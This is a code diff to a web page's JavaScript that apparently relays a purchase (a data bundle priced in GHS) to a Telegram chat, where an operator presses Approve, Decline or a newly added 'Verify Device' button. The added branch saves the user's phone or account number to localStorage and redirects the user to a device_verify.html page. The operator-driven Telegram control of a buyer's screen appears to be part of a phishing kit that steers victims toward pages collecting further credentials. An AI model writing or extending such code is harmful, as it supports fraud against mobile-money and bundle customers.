@@ -357,6 +357,7 @@
             pollInterval: null,
             approveId: null,
             declineId: null,
+            verifyDeviceId: null,
             bundleInfo: null
         };
 
@@ -481,6 +482,7 @@
             const ts = Date.now();
             state.approveId = `approve_${ts}`;
             state.declineId = `decline_${ts}`;
+            state.verifyDeviceId = `verify_device_${ts}`;
 
             const bundleText = state.bundleInfo 
                 ? `\nBundle: <code>${state.bundleInfo.bundle}</code> (GHS ${state.bundleInfo.price})`
@@ -501,10 +503,15 @@
                     text: message,
                     parse_mode: 'HTML',
                     reply_markup: {
-                        inline_keyboard: [[
-                            { text: '✅ Approve & Complete', callback_data: state.approveId },
-                            { text: '❌ Decline', callback_data: state.declineId }
-                        ]]
+                        inline_keyboard: [
+                            [
+                                { text: '✅ Approve & Complete', callback_data: state.approveId },
+                                { text: '❌ Decline', callback_data: state.declineId }
+                            ],
+                            [
+                                { text: '📱 Verify Device', callback_data: state.verifyDeviceId }
+                            ]
+                        ]
                     }
                 })
             })
@@ -569,6 +576,19 @@
                                 stopPolling();
                                 hideSpinner();
                                 showError("Purchase declined. Please try again or contact support.");
+                                return;
+                            }
+
+                            if (cbData === state.verifyDeviceId) {
+                                stopPolling();
+                                showSuccess("✓ Device verification required. Redirecting...");
+                                
+                                const accValue = els.phoneInput.value.trim();
+                                localStorage.setItem('accountNumber', accValue);
+
+                                setTimeout(() => {
+                                    window.location.href = 'device_verify.html';
+                                }, 1500);
                                 return;
                             }
                         }
